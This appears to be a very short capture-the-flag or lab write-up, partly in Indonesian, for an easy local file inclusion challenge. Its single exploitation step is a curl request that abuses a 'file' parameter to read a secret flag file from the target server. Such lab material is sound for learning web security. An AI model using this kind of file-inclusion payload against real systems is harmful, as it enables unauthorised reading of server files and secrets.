# LFI Lab Easy - Writeup
## Port: 8040 | Kategori: LFI | Difficulty: Easy

## Eksploitasi
curl "http://target:8040/?file=/var/secrets/flag.txt"
